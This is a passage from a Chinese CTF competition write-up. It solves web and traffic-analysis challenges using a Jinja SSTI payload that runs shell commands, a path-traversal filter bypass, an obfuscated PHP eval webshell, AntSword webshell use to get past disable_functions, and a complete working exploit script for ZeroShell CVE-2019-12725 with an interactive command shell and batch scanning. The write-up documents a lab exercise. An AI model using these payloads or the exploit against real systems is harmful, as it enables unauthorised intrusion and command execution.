try:</span></span><br><span class="line"><span class="string">        while True:</span></span><br><span class="line"><span class="string">            client_socket, addr = server_socket.accept()</span></span><br><span class="line"><span class="string">            print(f&quot;</span>Connection <span class="keyword">from</span> &#123;addr&#125;<span class="string">&quot;)</span></span><br><span class="line"><span class="string">            thread = threading.Thread(target=proxy_handler.handle_request, args=(client_socket,))</span></span><br><span class="line"><span class="string">            thread.daemon = True</span></span><br><span class="line"><span class="string">            thread.start()</span></span><br><span class="line"><span class="string">    except KeyboardInterrupt:</span></span><br><span class="line"><span class="string">        print(&quot;</span>Shutting down proxy server...<span class="string">&quot;)</span></span><br><span class="line"><span class="string">    finally:</span></span><br><span class="line"><span class="string">        server_socket.close()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">def run_flask_app():</span></span><br><span class="line"><span class="string">    app.run(debug=False, host=&#x27;127.0.0.1&#x27;, port=5000)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">if __name__ == &quot;</span>__main__<span class="string">&quot;:</span></span><br><span class="line"><span class="string">    proxy_host = &quot;</span><span class="number">0.0</span>.<span class="number">0.0</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">    proxy_port = 5001</span></span><br><span class="line"><span class="string">    target_host = &quot;</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">    target_port = 5000</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    # 安全反代，防止针对响应头的攻击</span></span><br><span class="line"><span class="string">    proxy_thread = threading.Thread(target=start_proxy_server, args=(proxy_host, proxy_port, target_host, target_port))</span></span><br><span class="line"><span class="string">    proxy_thread.daemon = True</span></span><br><span class="line"><span class="string">    proxy_thread.start()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    print(&quot;</span>Starting Flask app...<span class="string">&quot;)</span></span><br><span class="line"><span class="string">    run_flask_app()</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>

<p>直接本地启服务,设置回显让 fenjing 一把梭得出绕过黑名单的命令</p>
<p>一开始想复杂了,打算拿内存马打,之后又看到一篇<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/16325?time__1311=GuD=0KAKYK7KiKDsD7+d0=6RL=dGC3IztjeD#toc-2">基于错误页面的回显</a>,但是拿 fenjing 的 payload 梭不好使.打算自己本地手敲一个。</p>
<p>想尝试写文件的，但是页面还是会报错</p>
<p>后来又想到之前鹏程杯那道 python 题,也是无回显不出网,当时直接把 flag 写到 app.py 上,这次也试试看.</p>
<p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734234677051-43d1ff8d-a21a-476c-8f32-e913701b37ee.png"></p>
<p>payload:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=%<span class="number">7</span>B%<span class="number">25</span>set%<span class="number">20</span>gl%<span class="number">3</span>D<span class="string">&#x27;_&#x27;</span>*<span class="number">2</span>%<span class="number">2</span>B<span class="string">&#x27;globals&#x27;</span>%<span class="number">2</span>B<span class="string">&#x27;_&#x27;</span>*<span class="number">2</span>%<span class="number">25</span>%<span class="number">7</span>D%<span class="number">7</span>B%<span class="number">25</span>set%<span class="number">20</span>bu%<span class="number">3</span>D<span class="string">&#x27;_&#x27;</span>*<span class="number">2</span>%<span class="number">2</span>B<span class="string">&#x27;builtins&#x27;</span>%<span class="number">2</span>B<span class="string">&#x27;_&#x27;</span>*<span class="number">2</span>%<span class="number">25</span>%<span class="number">7</span>D%<span class="number">7</span>B%<span class="number">25</span>set%<span class="number">20</span>im%<span class="number">3</span>D<span class="string">&#x27;_&#x27;</span>*<span class="number">2</span>%<span class="number">2</span>B<span class="string">&#x27;i&#x27;</span><span class="string">&#x27;mport&#x27;</span>%<span class="number">2</span>B<span class="string">&#x27;_&#x27;</span>*<span class="number">2</span>%<span class="number">25</span>%<span class="number">7</span>D%<span class="number">7</span>B%<span class="number">25</span>set%<span class="number">20</span>oe%<span class="number">3</span>D<span class="string">&#x27;so&#x27;</span>%<span class="number">5</span>B%<span class="number">3</span>A%<span class="number">3</span>A-<span class="number">1</span>%<span class="number">5</span>D%<span class="number">25</span>%<span class="number">7</span>D%<span class="number">7</span>B%<span class="number">7</span>Bg.pop%<span class="number">5</span>Bgl%<span class="number">5</span>D%<span class="number">5</span>Bbu%<span class="number">5</span>D%<span class="number">5</span>Bim%<span class="number">5</span>D(oe)%<span class="number">5</span>B<span class="string">&#x27;p&#x27;</span><span class="string">&#x27;open&#x27;</span>%<span class="number">5</span>D(<span class="string">&#x27;cat%20%2Fflag%20%3E%20app.py&#x27;</span>).<span class="title function_ invoke__">read</span>()%<span class="number">7</span>D%<span class="number">7</span>D</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734234714918-6c52a4f3-2b62-4848-bf8c-802ae1ebacdb.png"></p>
<p>得出 flag, 真就这么简单啊.</p>
<p>工具链接：<a target="_blank" rel="noopener" href="https://github.com/Marven11/FenJing">https://github.com/Marven11/FenJing</a></p>
<h4 id="flag值：flag-9cb84d61-9040-47d7-b5ef-4c88ffa6e317"><a href="#flag值：flag-9cb84d61-9040-47d7-b5ef-4c88ffa6e317" class="headerlink" title="flag值：flag{9cb84d61-9040-47d7-b5ef-4c88ffa6e317}"></a>flag值：flag{9cb84d61-9040-47d7-b5ef-4c88ffa6e317}</h4><h3 id="hello-web"><a href="#hello-web" class="headerlink" title="hello_web"></a>hello_web</h3><h4 id="操作内容：-1"><a href="#操作内容：-1" class="headerlink" title="操作内容："></a>操作内容：</h4><p>这题一进去就是一个很可疑,带有文件包含的 url,查看源代码后更是有两个提示</p>
<p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734241597752-aac4bae5-6ef2-48e1-bf3e-3345ce7f91cb.png"></p>
<p>肯定是需要文件包含来读取这两个文件.</p>
<p>经过在 file 参数上的 fuzz,发现他限制长度13 过滤php:&#x2F;&#x2F;, data ,input,这样伪协议几乎是用不了</p>
<p>在尝试在 file 参数上进行目录穿越的时候发现..&#x2F;不被解析,然后..&#x2F;也没被 ban</p>
<p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734241795642-72545efd-41e6-44a3-8e9e-4fbafa605ff2.png"></p>
<p>既然他 ban ..&#x2F;的情况下,那么就是将..&#x2F;置空了,尝试传入</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//eci-2zecjw6gho6wjsdwij1l.cloudeci1.ichunqiu.com/index.php?file=..././tips.php</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734241883187-1e6ac8ab-8eba-4188-a4e5-d41e41a6256d.png"></p>
<p>靠!原来源码上的提示真的就是这样啊,要到上级目录的 tips.php 和 hackme.php</p>
<p>之后访问 hackme.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$lJbGIY</span>=<span class="string">&quot;eQOLlCmTYhVJUnRAobPSvjrFzWZycHXfdaukqGgwNptIBKiDsxME&quot;</span>;<span class="variable">$OlWYMv</span>=<span class="string">&quot;zqBZkOuwUaTKFXRfLgmvchbipYdNyAGsIWVEQnxjDPoHStCMJrel&quot;</span>;<span class="variable">$lapUCm</span>=<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A&quot;</span>);</span><br><span class="line"><span class="variable">$YwzIst</span>=<span class="variable">$lapUCm</span>&#123;<span class="number">3</span>&#125;.<span class="variable">$lapUCm</span>&#123;<span class="number">6</span>&#125;.<span class="variable">$lapUCm</span>&#123;<span class="number">33</span>&#125;.<span class="variable">$lapUCm</span>&#123;<span class="number">30</span>&#125;;<span class="variable">$OxirhK</span>=<span class="variable">$lapUCm</span>&#123;<span class="number">33</span>&#125;.<span class="variable">$lapUCm</span>&#123;<span class="number">10</span>&#125;.<span class="variable">$lapUCm</span>&#123;<span class="number">24</span>&#125;.<span class="variable">$lapUCm</span>&#123;<span class="number">10</span>&#125;.<span class="variable">$lapUCm</span>&#123;<span class="number">24</span>&#125;;<span class="variable">$YpAUWC</span>=<span class="variable">$OxirhK</span>&#123;<span class="number">0</span>&#125;.<span class="variable">$lapUCm</span>&#123;<span class="number">18</span>&#125;.<span class="variable">$lapUCm</span>&#123;<span class="number">3</span>&#125;.<span class="variable">$OxirhK</span>&#123;<span class="number">0</span>&#125;.<span class="variable">$OxirhK</span>&#123;<span class="number">1</span>&#125;.<span class="variable">$lapUCm</span>&#123;<span class="number">24</span>&#125;;<span class="variable">$rVkKjU</span>=<span class="variable">$lapUCm</span>&#123;<span class="number">7</span>&#125;.<span class="variable">$lapUCm</span>&#123;<span class="number">13</span>&#125;;<span class="variable">$YwzIst</span>.=<span class="variable">$lapUCm</span>&#123;<span class="number">22</span>&#125;.<span class="variable">$lapUCm</span>&#123;<span class="number">36</span>&#125;.<span class="variable">$lapUCm</span>&#123;<span class="number">29</span>&#125;.<span class="variable">$lapUCm</span>&#123;<span class="number">26</span>&#125;.<span class="variable">$lapUCm</span>&#123;<span class="number">30</span>&#125;.<span class="variable">$lapUCm</span>&#123;<span class="number">32</span>&#125;.<span class="variable">$lapUCm</span>&#123;<span class="number">35</span>&#125;.<span class="variable">$lapUCm</span>&#123;<span class="number">26</span>&#125;.<span class="variable">$lapUCm</span>&#123;<span class="number">30</span>&#125;;<span class="keyword">eval</span>(<span class="variable">$YwzIst</span>(<span class="string">&quot;JHVXY2RhQT0iZVFPTGxDbVRZaFZKVW5SQW9iUFN2anJGeldaeWNIWGZkYXVrcUdnd05wdElCS2lEc3hNRXpxQlprT3V3VWFUS0ZYUmZMZ212Y2hiaXBZZE55QUdzSVdWRVFueGpEUG9IU3RDTUpyZWxtTTlqV0FmeHFuVDJVWWpMS2k5cXcxREZZTkloZ1lSc0RoVVZCd0VYR3ZFN0hNOCtPeD09IjtldmFsKCc/PicuJFl3eklzdCgkT3hpcmhLKCRZcEFVV0MoJHVXY2RhQSwkclZrS2pVKjIpLCRZcEFVV0MoJHVXY2RhQSwkclZrS2pVLCRyVmtLalUpLCRZcEFVV0MoJHVXY2RhQSwwLCRyVmtLalUpKSkpOw==&quot;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>可能是一个木马,本地测试一下得到连接密码,直接蚁剑连接</p>
<p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734241996388-62fb0953-d662-41ed-96fa-cb7b201d86ff.png"></p>
<p>由于前面的 tips.php 能看到 disable_function 禁用了许多危险函数,在 LFI 文件夹新建一个马</p>
<p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734242067415-5829b6a9-05b6-4819-a1ed-40156982253f.png"></p>
<p>再次用蚁剑连接 a.php,并用插件来绕过 disable_fuction 即可</p>
<p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734242218096-b0999001-97a4-4601-aefa-d48de5be84fe.png"></p>
<p>连接生成的.antproxy.php</p>
<p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734242240715-2b96ae65-f88f-4ab1-aaa9-a0df5bcfb7a3.png"></p>
<p>通过 find 找到 flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734242270703-4566649d-293f-43d3-b1bf-15c2ec63d013.png"></p>
<h4 id="flag值：flag-91a89c19-e322-4ceb-8789-0bbc09b033f5"><a href="#flag值：flag-91a89c19-e322-4ceb-8789-0bbc09b033f5" class="headerlink" title="flag值：flag{91a89c19-e322-4ceb-8789-0bbc09b033f5}"></a>flag值：flag{91a89c19-e322-4ceb-8789-0bbc09b033f5}</h4><h2 id="威胁检测与网络流量分析"><a href="#威胁检测与网络流量分析" class="headerlink" title="威胁检测与网络流量分析"></a><font style="color:black;">威胁检测与网络流量分析</font></h2><h3 id="zeroshell-1"><a href="#zeroshell-1" class="headerlink" title="zeroshell_1"></a>zeroshell_1</h3><h4 id="操作内容：-2"><a href="#操作内容：-2" class="headerlink" title="操作内容："></a>操作内容：</h4><p>直接CTF-NetA扫描，看见Referer。</p>
<p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734253788880-9f36fb15-9e9b-458a-8746-ac978452b067.png"></p>
<p>直接Cyberchef解码，得到flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734253897936-0ac8368a-2e9f-41ff-9312-94af06dfb6e6.png"></p>
<h4 id="flag值：flag-6C2E38DA-D8E4-8D84-4A4F-E2ABD07A1F3A"><a href="#flag值：flag-6C2E38DA-D8E4-8D84-4A4F-E2ABD07A1F3A" class="headerlink" title="flag值：flag{6C2E38DA-D8E4-8D84-4A4F-E2ABD07A1F3A}"></a>flag值：flag{6C2E38DA-D8E4-8D84-4A4F-E2ABD07A1F3A}</h4><h3 id="zeroshell-2"><a href="#zeroshell-2" class="headerlink" title="zeroshell_2"></a>zeroshell_2</h3><h4 id="操作内容：-3"><a href="#操作内容：-3" class="headerlink" title="操作内容："></a>操作内容：</h4><p>根据手册搭建环境，</p>
<p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734254038074-69e3a7c4-e631-49ba-899c-586ee8870aad.png"></p>
<p>然后去网上搜zeroshell的exp直接搜到CVE-2019-12725随便找一个exp。我找的这个<a target="_blank" rel="noopener" href="https://gryffinbit.top/2022/11/16/ZeroShell-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-CVE-2019-12725/">https://gryffinbit.top/2022/11/16/ZeroShell-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-CVE-2019-12725/</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"><span class="keyword">from</span> argparse <span class="keyword">import</span> ArgumentParser</span><br><span class="line"><span class="keyword">import</span> threadpool</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)</span><br><span class="line">filename = sys.argv[<span class="number">1</span>]</span><br><span class="line">url_list=[]</span><br><span class="line"></span><br><span class="line"><span class="comment">#随机ua</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_ua</span>():</span><br><span class="line">	first_num = random.randint(<span class="number">55</span>, <span class="number">62</span>)</span><br><span class="line">	third_num = random.randint(<span class="number">0</span>, <span class="number">3200</span>)</span><br><span class="line">	fourth_num = random.randint(<span class="number">0</span>, <span class="number">140</span>)</span><br><span class="line">	os_type = [</span><br><span class="line">		<span class="string">&#x27;(Windows NT 6.1; WOW64)&#x27;</span>, <span class="string">&#x27;(Windows NT 10.0; WOW64)&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;(Macintosh; Intel Mac OS X 10_12_6)&#x27;</span></span><br><span class="line">	]</span><br><span class="line">	chrome_version = <span class="string">&#x27;Chrome/&#123;&#125;.0.&#123;&#125;.&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(first_num, third_num, fourth_num)</span><br><span class="line"></span><br><span class="line">	ua = <span class="string">&#x27; &#x27;</span>.join([<span class="string">&#x27;Mozilla/5.0&#x27;</span>, random.choice(os_type), <span class="string">&#x27;AppleWebKit/537.36&#x27;</span>,</span><br><span class="line">				   <span class="string">&#x27;(KHTML, like Gecko)&#x27;</span>, chrome_version, <span class="string">&#x27;Safari/537.36&#x27;</span>]</span><br><span class="line">				  )</span><br><span class="line">	<span class="keyword">return</span> ua</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_vuln</span>(<span class="params">url</span>):</span><br><span class="line">	url = parse.urlparse(url)</span><br><span class="line">	url2=url.scheme + <span class="string">&#x27;://&#x27;</span> + url.netloc </span><br><span class="line">	headers = &#123;</span><br><span class="line">		<span class="string">&#x27;User-Agent&#x27;</span>: get_ua(),</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment"># data=base64.b64encode(&quot;eyJzZXQtcHJvcGVydHkiOnsicmVxdWVzdERpc3BhdGNoZXIucmVxdWVzdFBhcnNlcnMuZW5hYmxlUmVtb3RlU3RyZWFtaW5nIjp0cnVlfX0=&quot;)</span></span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		res2 = requests.get(url2 + <span class="string">&#x27;/cgi-bin/kerbynet?Action=x509view&amp;Section=NoAuthREQ&amp;User=&amp;x509type=%27%0Aid%0A%27&#x27;</span>,headers=headers,timeout=<span class="number">10</span>,verify=<span class="literal">False</span>)</span><br><span class="line">		<span class="keyword">if</span> res2.status_code==<span class="number">200</span> <span class="keyword">and</span> <span class="string">&quot;uid&quot;</span> <span class="keyword">in</span> res2.text:</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&quot;\033[32m[+]%s is vuln\033[0m&quot;</span> %url2)</span><br><span class="line">			<span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&quot;\033[31m[-]%s is not vuln\033[0m&quot;</span> %url1)</span><br><span class="line">	<span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;\033[31m[-]%s is timeout\033[0m&quot;</span> %url2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#cmdshell</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmdshell</span>(<span class="params">url</span>):</span><br><span class="line">	<span class="keyword">if</span> check_vuln(url)==<span class="number">1</span>:</span><br><span class="line">		url = parse.urlparse(url)</span><br><span class="line">		url1 = url.scheme + <span class="string">&#x27;://&#x27;</span> + url.netloc + <span class="string">&#x27;/cgi-bin/kerbynet?Action=x509view&amp;Section=NoAuthREQ&amp;User=&amp;x509type=%27%0A&#x27;</span></span><br><span class="line">		<span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">			shell = <span class="built_in">input</span>(<span class="string">&quot;\033[35mcmd: \033[0m&quot;</span>)</span><br><span class="line">			<span class="keyword">if</span> shell ==<span class="string">&quot;exit&quot;</span>:</span><br><span class="line">				sys.exit(<span class="number">0</span>)</span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				headers = &#123;</span><br><span class="line">					<span class="string">&#x27;User-Agent&#x27;</span>: get_ua(),</span><br><span class="line">					&#125;</span><br><span class="line">				<span class="keyword">try</span>:</span><br><span class="line">					res = requests.get(url1 + shell + <span class="string">&#x27;%0A%27&#x27;</span>,headers=headers,timeout=<span class="number">10</span>,verify=<span class="literal">False</span>)</span><br><span class="line">					<span class="keyword">if</span> res.status_code==<span class="number">200</span> <span class="keyword">and</span> <span class="built_in">len</span>(res.text) != <span class="number">0</span>:</span><br><span class="line">						vulntext=res.text.split(<span class="string">&#x27;&lt;html&gt;&#x27;</span>)</span><br><span class="line">						<span class="built_in">print</span>(<span class="string">&quot;\033[32m%s\033[0m&quot;</span> %vulntext[<span class="number">0</span>])</span><br><span class="line">					<span class="keyword">else</span>:</span><br><span class="line">						<span class="built_in">print</span>(<span class="string">&quot;\033[31m[-]%s Command execution failed !\033[0m&quot;</span> %url1)</span><br><span class="line">				<span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">					<span class="built_in">print</span>(<span class="string">&quot;\033[31m[-]%s is timeout!\033[0m&quot;</span> %url1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#多线程</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">multithreading</span>(<span class="params">url_list, pools=<span class="number">5</span></span>):</span><br><span class="line">	works = []</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> url_list:</span><br><span class="line">		<span class="comment"># works.append((func_params, None))</span></span><br><span class="line">		works.append(i)</span><br><span class="line">	<span class="comment"># print(works)</span></span><br><span class="line">	pool = threadpool.ThreadPool(pools)</span><br><span class="line">	reqs = threadpool.makeRequests(check_vuln, works)</span><br><span class="line">	[pool.putRequest(req) <span class="keyword">for</span> req <span class="keyword">in</span> reqs]</span><br><span class="line">	pool.wait()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	show = <span class="string">r&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">	 _____ _   _ _____       _____  _____  __   _____        __   _____  ___________  _____ </span></span><br><span class="line"><span class="string">	/  __ \ | | |  ___|     / __  \|  _  |/  | |  _  |      /  | / __  \|___  / __  \|  ___|</span></span><br><span class="line"><span class="string">	| /  \/ | | | |__ ______`&#x27; / /&#x27;| |/&#x27; |`| | | |_| |______`| | `&#x27; / /&#x27;   / /`&#x27; / /&#x27;|___ \ </span></span><br><span class="line"><span class="string">	| |   | | | |  __|______| / /  |  /| | | | \____ |______|| |   / /    / /   / /      \ \</span></span><br><span class="line"><span class="string">	| \__/\ \_/ / |___      ./ /___\ |_/ /_| |_.___/ /      _| |_./ /___./ /  ./ /___/\__/ /</span></span><br><span class="line"><span class="string">	 \____/\___/\____/      \_____/ \___/ \___/\____/       \___/\_____/\_/   \_____/\____/ </span></span><br><span class="line"><span class="string">                                                                                        </span></span><br><span class="line"><span class="string">                                                                                                                                                                                                                  </span></span><br><span class="line"><span class="string">                                                                                                      </span></span><br><span class="line"><span class="string">                              		                     CVE-2019-12725 By m2</span></span><br><span class="line"><span class="string">	&#x27;&#x27;&#x27;</span></span><br><span class="line">	<span class="built_in">print</span>(show + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">	arg=ArgumentParser(description=<span class="string">&#x27;CVE-2019-12725 By m2&#x27;</span>)</span><br><span class="line">	arg.add_argument(<span class="string">&quot;-u&quot;</span>,</span><br><span class="line">						<span class="string">&quot;--url&quot;</span>,</span><br><span class="line">						<span class="built_in">help</span>=<span class="string">&quot;Target URL; Example:http://ip:port&quot;</span>)</span><br><span class="line">	arg.add_argument(<span class="string">&quot;-f&quot;</span>,</span><br><span class="line">						<span class="string">&quot;--file&quot;</span>,</span><br><span class="line">						<span class="built_in">help</span>=<span class="string">&quot;Target URL; Example:url.txt&quot;</span>)</span><br><span class="line">	arg.add_argument(<span class="string">&quot;-c&quot;</span>,</span><br><span class="line">					<span class="string">&quot;--cmd&quot;</span>,</span><br><span class="line">					<span class="built_in">help</span>=<span class="string">&quot;Target URL; Example:http://ip:port&quot;</span>)</span><br><span class="line">	args=arg.parse_args()</span><br><span class="line">	url=args.url</span><br><span class="line">	filename=args.file</span><br><span class="line">	cmd=args.cmd</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&#x27;[*]任务开始...&#x27;</span>)</span><br><span class="line">	<span class="keyword">if</span> url != <span class="literal">None</span> <span class="keyword">and</span> cmd == <span class="literal">None</span> <span class="keyword">and</span> filename == <span class="literal">None</span>:</span><br><span class="line">		check_vuln(url)</span><br><span class="line">	<span class="keyword">elif</span> url == <span class="literal">None</span> <span class="keyword">and</span> cmd == <span class="literal">None</span> <span class="keyword">and</span> filename != <span class="literal">None</span>:</span><br><span class="line">		start=time()</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">open</span>(filename):</span><br><span class="line">			i=i.replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">			check_vuln(i)</span><br><span class="line">		end=time()</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&#x27;任务完成，用时%d&#x27;</span> %(end-start))</span><br><span class="line">	<span class="keyword">elif</span> url == <span class="literal">None</span> <span class="keyword">and</span> cmd != <span class="literal">None</span> <span class="keyword">and</span> filename == <span class="literal">None</span>:</span><br><span class="line">		cmdshell(cmd)</span><br></pre></td></tr></table></figure>

<p>然后运行，</p>
<p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734254564522-b7afb0b4-240a-4720-ab02-1a6dcfcf7122.png"></p>
<p>然后去找flag，在<code>/Database/flag</code>下面。</p>
<p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734254664677-630e59da-84ad-41d5-9d1f-5ba6c678780c.png"></p>
<p>得到flag</p>
<h4 id="flag值：flag-c6045425-6e6e-41d0-be09-95682a4f65c4"><a href="#flag值：flag-c6045425-6e6e-41d0-be09-95682a4f65c4" class="headerlink" title="flag值：flag{c6045425-6e6e-41d0-be09-95682a4f65c4}"></a>flag值：flag{c6045425-6e6e-41d0-be09-95682a4f65c4}</h4><h3 id="zeroshell-3"><a href="#zeroshell-3" class="headerlink" title="zeroshell_3"></a>zeroshell_3</h3><h4 id="操作内容：-4"><a href="#操作内容：-4" class="headerlink" title="操作内容："></a>操作内容：</h4><p>查看主机的外联服务器的所有TCP，UDP，IP和进程使用</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -antp</span><br></pre></td></tr></table></figure>

<p>（但是有点抽象，有时候看不到那个IP，）其他都是127.0.0.1只有他一个。</p>
<p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734255241504-31aef6a1-cecb-481a-89f5-78cd4caefc9d.png"></p>
